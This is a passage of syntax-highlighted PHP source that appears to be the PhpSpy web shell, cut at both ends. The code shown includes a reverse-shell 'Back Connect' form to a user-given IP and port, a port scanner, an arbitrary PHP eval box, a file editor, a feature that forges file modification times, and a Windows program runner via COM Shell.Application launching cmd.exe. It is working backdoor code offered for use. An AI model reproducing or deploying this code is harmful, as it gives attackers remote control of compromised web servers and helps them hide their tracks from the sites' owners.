        <span class="p">}</span>
        <span class="nx">m</span><span class="p">(</span><span class="s2">&quot;Now script try connect to </span><span class="si">$yourip</span><span class="s2"> port </span><span class="si">$yourport</span><span class="s2"> ...&quot;</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="nx">formhead</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Back Connect&#39;</span><span class="p">));</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;action&#39;</span><span class="p">,</span><span class="s1">&#39;backconnect&#39;</span><span class="p">);</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;p&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;Your IP:&#39;</span><span class="p">);</span>
    <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;yourip&#39;</span><span class="p">,</span><span class="s1">&#39;size&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">20</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$yourip</span><span class="p">));</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;Your Port:&#39;</span><span class="p">);</span>
    <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;yourport&#39;</span><span class="p">,</span><span class="s1">&#39;size&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">15</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$yourport</span><span class="p">));</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;Use:&#39;</span><span class="p">);</span>
    <span class="nx">makeselect</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;use&#39;</span><span class="p">,</span><span class="s1">&#39;option&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$usedb</span><span class="p">,</span><span class="s1">&#39;selected&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$use</span><span class="p">));</span>
    <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;start&#39;</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Start&#39;</span><span class="p">,</span><span class="s1">&#39;type&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;submit&#39;</span><span class="p">,</span><span class="s1">&#39;class&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;bt&#39;</span><span class="p">));</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/p&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">formfoot</span><span class="p">();</span>
<span class="p">}</span><span class="c1">//end</span>

<span class="k">elseif</span> <span class="p">(</span><span class="nv">$action</span> <span class="o">==</span> <span class="s1">&#39;portscan&#39;</span><span class="p">)</span> <span class="p">{</span>
    <span class="o">!</span><span class="nv">$scanip</span> <span class="o">&amp;&amp;</span> <span class="nv">$scanip</span> <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">;</span>
    <span class="o">!</span><span class="nv">$scanport</span> <span class="o">&amp;&amp;</span> <span class="nv">$scanport</span> <span class="o">=</span> <span class="s1">&#39;21,25,80,110,135,139,445,1433,3306,3389,5631,43958&#39;</span><span class="p">;</span>
    <span class="nx">formhead</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Port Scan&#39;</span><span class="p">));</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;action&#39;</span><span class="p">,</span><span class="s1">&#39;portscan&#39;</span><span class="p">);</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;p&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;IP:&#39;</span><span class="p">);</span>
    <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;scanip&#39;</span><span class="p">,</span><span class="s1">&#39;size&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">20</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$scanip</span><span class="p">));</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;Port:&#39;</span><span class="p">);</span>
    <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;scanport&#39;</span><span class="p">,</span><span class="s1">&#39;size&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">80</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$scanport</span><span class="p">));</span>
    <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;startscan&#39;</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Scan&#39;</span><span class="p">,</span><span class="s1">&#39;type&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;submit&#39;</span><span class="p">,</span><span class="s1">&#39;class&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;bt&#39;</span><span class="p">));</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/p&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">formfoot</span><span class="p">();</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$startscan</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;h2&amp;gt;Result &amp;raquo;&amp;lt;/h2&amp;gt;&#39;</span><span class="p">);</span>
        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;ul class=&quot;info&quot;&amp;gt;&#39;</span><span class="p">);</span>
        <span class="k">foreach</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="nv">$scanport</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$port</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fsockopen</span><span class="p">(</span><span class="nv">$scanip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="o">&amp;</span><span class="nv">$errno</span><span class="p">,</span> <span class="o">&amp;</span><span class="nv">$errstr</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> 
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;li&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$scanip</span><span class="o">.</span><span class="s1">&#39;:&#39;</span><span class="o">.</span><span class="nv">$port</span><span class="o">.</span><span class="s1">&#39; ------------------------ &amp;lt;span style=&quot;font-weight:bold;color:#f00;&quot;&amp;gt;Close&amp;lt;/span&amp;gt;&amp;lt;/li&amp;gt;&#39;</span><span class="p">);</span>
           <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;li&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$scanip</span><span class="o">.</span><span class="s1">&#39;:&#39;</span><span class="o">.</span><span class="nv">$port</span><span class="o">.</span><span class="s1">&#39; ------------------------ &amp;lt;span style=&quot;font-weight:bold;color:#080;&quot;&amp;gt;Open&amp;lt;/span&amp;gt;&amp;lt;/li&amp;gt;&#39;</span><span class="p">);</span>
                <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
           <span class="p">}</span> 
        <span class="p">}</span>
        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/ul&amp;gt;&#39;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">elseif</span> <span class="p">(</span><span class="nv">$action</span> <span class="o">==</span> <span class="s1">&#39;eval&#39;</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$phpcode</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$phpcode</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$phpcode</span><span class="p">){</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;#&amp;lt;\?#si&#39;</span><span class="p">,</span> <span class="nv">$phpcode</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$phpcode</span> <span class="o">=</span> <span class="s2">&quot;&lt;?php</span><span class="se">\n\n</span><span class="si">{</span><span class="nv">$phpcode</span><span class="si">}</span><span class="se">\n\n</span><span class="s2">?&gt;&quot;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">eval</span><span class="p">(</span><span class="s2">&quot;?&quot;</span><span class="o">.</span><span class="s2">&quot;&amp;gt;</span><span class="si">$phpcode</span><span class="s2">&lt;?&quot;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nx">formhead</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Eval PHP Code&#39;</span><span class="p">));</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;action&#39;</span><span class="p">,</span><span class="s1">&#39;eval&#39;</span><span class="p">);</span>
    <span class="nx">maketext</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;PHP Code&#39;</span><span class="p">,</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;phpcode&#39;</span><span class="p">,</span> <span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$phpcode</span><span class="p">));</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;p&amp;gt;&amp;lt;a href=&quot;http://w&#39;</span><span class="o">.</span><span class="s1">&#39;ww.4ng&#39;</span><span class="o">.</span><span class="s1">&#39;el.net/php&#39;</span><span class="o">.</span><span class="s1">&#39;spy/pl&#39;</span><span class="o">.</span><span class="s1">&#39;ugin/&quot; target=&quot;_blank&quot;&amp;gt;Get plugins&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">formfooter</span><span class="p">();</span>
<span class="p">}</span><span class="c1">//end eval</span>

<span class="k">elseif</span> <span class="p">(</span><span class="nv">$action</span> <span class="o">==</span> <span class="s1">&#39;editfile&#39;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$opfile</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$fp</span><span class="o">=@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$opfile</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">);</span>
        <span class="nv">$contents</span><span class="o">=@</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nb">filesize</span><span class="p">(</span><span class="nv">$opfile</span><span class="p">));</span>
        <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
        <span class="nv">$contents</span><span class="o">=</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$contents</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nx">formhead</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Create / Edit File&#39;</span><span class="p">));</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;action&#39;</span><span class="p">,</span><span class="s1">&#39;file&#39;</span><span class="p">);</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;dir&#39;</span><span class="p">,</span><span class="nv">$nowpath</span><span class="p">);</span>
    <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Current File (import new file name and new file)&#39;</span><span class="p">,</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;editfilename&#39;</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$opfile</span><span class="p">,</span><span class="s1">&#39;newline&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">1</span><span class="p">));</span>
    <span class="nx">maketext</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;File Content&#39;</span><span class="p">,</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;filecontent&#39;</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$contents</span><span class="p">));</span>
    <span class="nx">formfooter</span><span class="p">();</span>
    
    <span class="nx">goback</span><span class="p">();</span>

<span class="p">}</span><span class="c1">//end editfile</span>

<span class="k">elseif</span> <span class="p">(</span><span class="nv">$action</span> <span class="o">==</span> <span class="s1">&#39;newtime&#39;</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$opfilemtime</span> <span class="o">=</span> <span class="o">@</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$opfile</span><span class="p">);</span>
    <span class="c1">//$time = strtotime(&quot;$year-$month-$day $hour:$minute:$second&quot;);</span>
    <span class="nv">$cachemonth</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;January&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;February&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">2</span><span class="p">,</span><span class="s1">&#39;March&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">3</span><span class="p">,</span><span class="s1">&#39;April&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">4</span><span class="p">,</span><span class="s1">&#39;May&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">5</span><span class="p">,</span><span class="s1">&#39;June&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">6</span><span class="p">,</span><span class="s1">&#39;July&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">7</span><span class="p">,</span><span class="s1">&#39;August&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;September&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">9</span><span class="p">,</span><span class="s1">&#39;October&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">10</span><span class="p">,</span><span class="s1">&#39;November&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">11</span><span class="p">,</span><span class="s1">&#39;December&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">12</span><span class="p">);</span>
    <span class="nx">formhead</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Clone folder/file was last modified time&#39;</span><span class="p">));</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;action&#39;</span><span class="p">,</span><span class="s1">&#39;file&#39;</span><span class="p">);</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;dir&#39;</span><span class="p">,</span><span class="nv">$nowpath</span><span class="p">);</span>
    <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Alter folder/file&#39;</span><span class="p">,</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;curfile&#39;</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$opfile</span><span class="p">,</span><span class="s1">&#39;size&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">120</span><span class="p">,</span><span class="s1">&#39;newline&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">1</span><span class="p">));</span>
    <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Reference folder/file (fullpath)&#39;</span><span class="p">,</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;tarfile&#39;</span><span class="p">,</span><span class="s1">&#39;size&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">120</span><span class="p">,</span><span class="s1">&#39;newline&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">1</span><span class="p">));</span>
    <span class="nx">formfooter</span><span class="p">();</span>
    <span class="nx">formhead</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Set last modified&#39;</span><span class="p">));</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;action&#39;</span><span class="p">,</span><span class="s1">&#39;file&#39;</span><span class="p">);</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;dir&#39;</span><span class="p">,</span><span class="nv">$nowpath</span><span class="p">);</span>
    <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Current folder/file (fullpath)&#39;</span><span class="p">,</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;curfile&#39;</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$opfile</span><span class="p">,</span><span class="s1">&#39;size&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">120</span><span class="p">,</span><span class="s1">&#39;newline&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">1</span><span class="p">));</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;p&amp;gt;year:&#39;</span><span class="p">);</span>
    <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;year&#39;</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="nv">$opfilemtime</span><span class="p">),</span><span class="s1">&#39;size&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">4</span><span class="p">));</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;month:&#39;</span><span class="p">);</span>
    <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;month&#39;</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">,</span><span class="nv">$opfilemtime</span><span class="p">),</span><span class="s1">&#39;size&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">2</span><span class="p">));</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;day:&#39;</span><span class="p">);</span>
    <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;day&#39;</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;d&#39;</span><span class="p">,</span><span class="nv">$opfilemtime</span><span class="p">),</span><span class="s1">&#39;size&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">2</span><span class="p">));</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;hour:&#39;</span><span class="p">);</span>
    <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;hour&#39;</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;H&#39;</span><span class="p">,</span><span class="nv">$opfilemtime</span><span class="p">),</span><span class="s1">&#39;size&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">2</span><span class="p">));</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;minute:&#39;</span><span class="p">);</span>
    <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;minute&#39;</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;i&#39;</span><span class="p">,</span><span class="nv">$opfilemtime</span><span class="p">),</span><span class="s1">&#39;size&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">2</span><span class="p">));</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;second:&#39;</span><span class="p">);</span>
    <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;second&#39;</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">,</span><span class="nv">$opfilemtime</span><span class="p">),</span><span class="s1">&#39;size&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">2</span><span class="p">));</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/p&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">formfooter</span><span class="p">();</span>
    <span class="nx">goback</span><span class="p">();</span>
<span class="p">}</span><span class="c1">//end newtime</span>

<span class="k">elseif</span> <span class="p">(</span><span class="nv">$action</span> <span class="o">==</span> <span class="s1">&#39;shell&#39;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">IS_WIN</span> <span class="o">&amp;&amp;</span> <span class="nx">IS_COM</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$program</span> <span class="o">&amp;&amp;</span> <span class="nv">$parameter</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$shell</span><span class="o">=</span> <span class="k">new</span> <span class="nx">COM</span><span class="p">(</span><span class="s1">&#39;Shell.Application&#39;</span><span class="p">);</span>
            <span class="nv">$a</span> <span class="o">=</span> <span class="nv">$shell</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">ShellExecute</span><span class="p">(</span><span class="nv">$program</span><span class="p">,</span><span class="nv">$parameter</span><span class="p">);</span>
            <span class="nx">m</span><span class="p">(</span><span class="s1">&#39;Program run has &#39;</span><span class="o">.</span><span class="p">(</span><span class="o">!</span><span class="nv">$a</span> <span class="o">?</span> <span class="s1">&#39;success&#39;</span> <span class="o">:</span> <span class="s1">&#39;fail&#39;</span><span class="p">));</span>
        <span class="p">}</span>
        <span class="o">!</span><span class="nv">$program</span> <span class="o">&amp;&amp;</span> <span class="nv">$program</span> <span class="o">=</span> <span class="s1">&#39;c:\windows\system32\cmd.exe&#39;</span><span class="p">;</span>
        <span class="o">!</span><span class="nv">$parameter</span> <span class="o">&amp;&amp;</span> <span class="nv">$parameter</span> <span class="o">=</span> <span class="s1">&#39;/c net start &amp;gt; &#39;</span><span class="o">.</span><span class="nx">SA_ROOT</span><span class="o">.</span><span class="s1">&#39;log.txt&#39;</span><span class="p">;</span>
        <span class="nx">formhead</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Execute Program&#39;</span><span class="p">));</span>
        <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;action&#39;</span><span class="p">,</span><span class="s1">&#39;shell&#39;</span><span class="p">);</span>
        <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Program&#39;</span><span class="p">,</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;program&#39;</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$program</span><span class="p">,</span><span class="s1">&#39;newline&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">1</span><span class="p">));</span>
        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;p&amp;gt;&#39;</span><span class="p">);</span>
        <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Parameter&#39;</span><span class="p">,</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;parameter&#39;</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$parameter</span><span class="p">));</span>
        <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;submit&#39;</span><span class="p">,</span><span class="s1">&#39;class&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;bt&#39;</span><span class="p">,</span><span class="s1">&#39;type&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;submit&#39;</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Execute&#39;</span><span class="p">));</span>
